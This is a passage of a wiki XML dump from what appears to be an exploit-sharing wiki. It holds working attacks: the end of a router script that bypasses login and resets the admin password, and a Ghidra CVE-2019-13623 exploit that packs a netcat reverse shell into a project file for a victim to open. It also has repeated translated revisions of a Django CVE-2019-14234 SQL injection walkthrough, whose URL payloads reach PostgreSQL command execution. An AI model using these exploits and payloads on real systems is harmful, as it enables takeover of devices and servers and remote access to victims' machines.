UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36"
headers = {
    "User-Agent": UA,
    "Cookie": payload
}

def exp(ip):
    info = """1. Login with no password\n2. Change administrator's password\n"""
    print info
    op = int(raw_input("Enter the options:"))
    if op == 1:
        url = "http://" + str(ip)+"/home.htm"
        try:
            res = requests.get(url,headers=headers,timeout=5)
            if "title.htm" in res.text:
                print "[+] The router is vulnerable"
            else:
                print "[-] The router is not vulnerable"
        except Exception as e:
            print str(e)

    elif(op == 2):
        url = "http://" + str(ip) + "/boafrm/formAwifiSwitchSetup"
        data = {
            "olduserpass":"1",
            "newpass":"123456",
            "confirmnewpass":"123456",
            "submit-url":"/password.htm"
        }
        try:
            res = requests.post(url=url,headers=headers,data=data,timeout=5)
            if "restartNow" in res.text:
                print "[+] Password had be changed to 123456"
            else:
                print "[-] Some error!"
        except Exception as e:
            print str(e)

    else:
        print "error options!"
if __name__ == '__main__':
    ip = sys.argv[1]
    exp(ip)
&lt;/pre&gt;</text>
      <sha1>sodpk8hgh5e7adjo6dl7jpf1cllpc2g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-13623 Ghidra (Linux) 9.0.4 - .gar 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>1599</id>
    <revision>
      <id>2002</id>
      <timestamp>2021-05-02T04:22:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; import os import inspect import argparse import shutil from shutil import copyfile  print("") print("") print("################################################")..."</comment>
      <origin>2002</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2530" sha1="qsmslvzmhs23f0sene4vrm81zmvoopr" xml:space="preserve">==EXP==
&lt;pre&gt;
import os
import inspect
import argparse
import shutil
from shutil import copyfile

print("")
print("")
print("################################################")
print("")
print("------------------CVE-2019-13623----------------")
print("")
print("################################################")
print("")
print("-----------------Ghidra-Exploit-----------------")
print("--Tested version: Ghidra Linux version &lt;= 9.0.4-")
print("------------------------------------------------")
print("")
print("################################################")
print("")
print("----------Exploit by: Etienne Lacoche-----------")
print("---------Contact Twitter: @electr0sm0g----------")
print("")
print("------------------Discovered by:----------------")
print("---------https://blog.fxiao.me/ghidra/----------")
print("")
print("--------Exploit tested on Ubuntu 18.04----------")
print("-----------------Dependency: zip----------------")
print("")
print("################################################")
print("")
print("")

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input export .gar file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)

args = parser.parse_args()
            
if args.ip and args.port and args.file:

    rootDirURL=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
    path = "../Ghidra/Features/Decompiler/os/linux64/decompile"
    os.system("mkdir -p ../Ghidra/Features/Decompiler/os/linux64/")
    os.system("echo 'rm -f x; mknod x p &amp;&amp; nc "+args.ip+" "+args.port+" 0&lt;x | /bin/bash 1&gt;x' &gt; decompile")
    os.system("chmod +x decompile")
    copyfile("decompile",path)
    copyfile(args.file,rootDirURL+"/"+"project.gar")
    os.system("zip -q project.gar ../Ghidra/Features/Decompiler/os/linux64/decompile")
    os.system("echo 'To fully export this archive, place project.gar to GHIDRA_INSTALL_DIR root path and open it with Restore Project at Ghidra.' &gt; README_BEFORE_OPEN_GAR_FILE")
    os.system("zip -q project.zip README_BEFORE_OPEN_GAR_FILE")    
    os.system("zip -q project.zip project.gar") 
    os.system("rm decompile README_BEFORE_OPEN_GAR_FILE")
    os.system("rm project.gar")
    print("You can now share project.zip and start your local netcat listener.")
    print("")
    print("Project.gar must be placed and opened by victim at GHIDRA_INSTALL_DIR")
    print("root path for payload execution.")
    print("")
            
&lt;/pre&gt;</text>
      <sha1>qsmslvzmhs23f0sene4vrm81zmvoopr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-1388 Windows UAC權限提升漏洞</title>
    <ns>0</ns>
    <id>71</id>
    <revision>
      <id>135</id>
      <timestamp>2021-03-02T14:06:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==EXP== https://github.com/sv3nbeast/CVE-2019-1388」的新頁面</comment>
      <origin>135</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="50" sha1="kza55ngtlcq8b5swuriwskg82frxcr2" xml:space="preserve">==EXP==
https://github.com/sv3nbeast/CVE-2019-1388</text>
      <sha1>kza55ngtlcq8b5swuriwskg82frxcr2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14234 Django JSONField SQL注入漏洞</title>
    <ns>0</ns>
    <id>868</id>
    <revision>
      <id>1130</id>
      <timestamp>2021-04-07T11:47:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Django 2.2.x &lt; 2.2.4  Django 2.1.x &lt; 2.1.11  Django 1.11.x &lt; 1.11.23 &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用== &lt;/tr..."</comment>
      <origin>1130</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1427" sha1="9rcppxfpom1o83ww1eqq3i1xl7kmnmm" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
首先需登錄管理員後臺，訪問模型Collection的管理頁面：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;translate&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/translate&gt;


&lt;translate&gt;
訪問以下URL：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

&lt;translate&gt;
回顯&lt;code&gt;no results to fetch&lt;/code&gt; 語句成功執行。
&lt;/translate&gt;

&lt;translate&gt;
訪問：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;translate&gt;
命令成功執行。
&lt;/translate&gt;

===⚠️️===
&lt;translate&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/translate&gt;</text>
      <sha1>9rcppxfpom1o83ww1eqq3i1xl7kmnmm</sha1>
    </revision>
    <revision>
      <id>1131</id>
      <parentid>1130</parentid>
      <timestamp>2021-04-07T11:48:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1131</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1526" sha1="o8ny780kw2ezhvml9pb6j0t1ypzq8af" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先需登錄管理員後臺，訪問模型Collection的管理頁面：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/translate&gt;


&lt;translate&gt;
&lt;!--T:5--&gt;
訪問以下URL：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:6--&gt;
回顯&lt;code&gt;no results to fetch&lt;/code&gt; 語句成功執行。
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:7--&gt;
訪問：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:8--&gt;
命令成功執行。
&lt;/translate&gt;

===⚠️️===
&lt;translate&gt;
&lt;!--T:9--&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/translate&gt;</text>
      <sha1>o8ny780kw2ezhvml9pb6j0t1ypzq8af</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14234 Django JSONField SQL注入漏洞/es</title>
    <ns>0</ns>
    <id>4577</id>
    <revision>
      <id>5265</id>
      <timestamp>2021-06-17T01:15:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "acceso:"</comment>
      <origin>5265</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1349" sha1="efxw1e78lb6leu3fylnvrd9hvzv2i35" xml:space="preserve">&lt;languages   /&gt;

== Versión afectada ==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

== Explotar ==

Primero, debe iniciar sesión en el fondo del administrador y acceder a la página de administración de la colección de modelos:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django se usa generalmente con PostgreSQL. Puede intentar aprovechar la vulnerabilidad de ejecución de comandos de alto privilegio de PostgreSQL [https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


Visite la siguiente URL:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

Haga eco de la sentencia &lt;code&gt;no results to fetch&lt;/code&gt;  ejecutada con éxito.

acceso:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

El comando se ejecutó con éxito.

===⚠️️===
&lt;code&gt; test.dnslog.cn &lt;/code&gt; modifique a su propio Dnslog</text>
      <sha1>efxw1e78lb6leu3fylnvrd9hvzv2i35</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14234 Django JSONField SQL注入漏洞/ru</title>
    <ns>0</ns>
    <id>4457</id>
    <revision>
      <id>5132</id>
      <timestamp>2021-06-16T01:56:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Подтвердите успешно выполненный оператор &lt;code&gt;no results to fetch &lt;/code&gt;."</comment>
      <origin>5132</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1629" sha1="2quncbtem51o2pogavoyvl3xe3eorfz" xml:space="preserve">&lt;languages   /&gt;

==Затронутая версия==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

== Эксплуатация ==

Во-первых, вам необходимо войти в систему в фоновом режиме администратора и получить доступ к странице управления  model Collection:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/div&gt;


Посетите следующий URL:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

Подтвердите успешно выполненный оператор &lt;code&gt;no results to fetch &lt;/code&gt;.

доступ:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

Команда была выполнена успешно.

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>2quncbtem51o2pogavoyvl3xe3eorfz</sha1>
    </revision>
    <revision>
      <id>5147</id>
      <parentid>5132</parentid>
      <timestamp>2021-06-16T02:00:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>5147</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1624" sha1="2zsmaa91f2t38mkmfs42ojv4zry1ox8" xml:space="preserve">&lt;languages   /&gt;

==Затронутая версия==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

== Эксплуатация ==

Во-первых, вам необходимо войти в систему в фоновом режиме администратора и получить доступ к странице управления  model Collection:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/div&gt;


Посетите следующий URL:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

Подтвердите успешно выполненный оператор &lt;code&gt;no results to fetch &lt;/code&gt;.

доступ:
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

Команда была выполнена успешно.

===⚠️️===
&lt;code&gt; test.dnslog.cn &lt;/code&gt; измените его на свой собственный журнал Dnslog</text>
      <sha1>2zsmaa91f2t38mkmfs42ojv4zry1ox8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14234 Django JSONField SQL注入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6177</id>
    <revision>
      <id>7068</id>
      <timestamp>2021-07-12T07:59:10Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CVE-2019-14234 Django JSONField SQL注入漏洞"</comment>
      <origin>7068</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1629" sha1="hs6u16zcxb6p5t2jdk293lthkvaudve" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
首先需登錄管理員後臺，訪問模型Collection的管理頁面：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問以下URL：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
回顯&lt;code&gt;no results to fetch&lt;/code&gt; 語句成功執行。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
命令成功執行。
&lt;/div&gt;

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>hs6u16zcxb6p5t2jdk293lthkvaudve</sha1>
    </revision>
    <revision>
      <id>7070</id>
      <parentid>7068</parentid>
      <timestamp>2021-07-12T07:59:42Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "首先需登录管理员后台，访问模型Collection的管理页面："</comment>
      <origin>7070</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1568" sha1="f0260fo9u20gc7zxwzqzfy9lnd9rxaw" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Django一般與PostgreSQL一起配合使用，可以嘗試利用PostgreSQL 高權限命令執行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問以下URL：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
回顯&lt;code&gt;no results to fetch&lt;/code&gt; 語句成功執行。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
命令成功執行。
&lt;/div&gt;

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>f0260fo9u20gc7zxwzqzfy9lnd9rxaw</sha1>
    </revision>
    <revision>
      <id>7073</id>
      <parentid>7070</parentid>
      <timestamp>2021-07-12T08:00:15Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%..."</comment>
      <origin>7073</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1446" sha1="osyrxfflcv3sysszu12236ukix8ctja" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
回顯&lt;code&gt;no results to fetch&lt;/code&gt; 語句成功執行。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
命令成功執行。
&lt;/div&gt;

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>osyrxfflcv3sysszu12236ukix8ctja</sha1>
    </revision>
    <revision>
      <id>7076</id>
      <parentid>7073</parentid>
      <timestamp>2021-07-12T08:00:42Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。"</comment>
      <origin>7076</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1385" sha1="p40sf4zzbczj55cjvvdylp9wxlrlz5a" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問：
&lt;/div&gt;
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
命令成功執行。
&lt;/div&gt;

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>p40sf4zzbczj55cjvvdylp9wxlrlz5a</sha1>
    </revision>
    <revision>
      <id>7078</id>
      <parentid>7076</parentid>
      <timestamp>2021-07-12T08:00:49Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "命令成功执行。"</comment>
      <origin>7078</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1324" sha1="2fhqkxhpggd6l905pgkjwlpoabmqvoi" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問：
&lt;/div&gt;
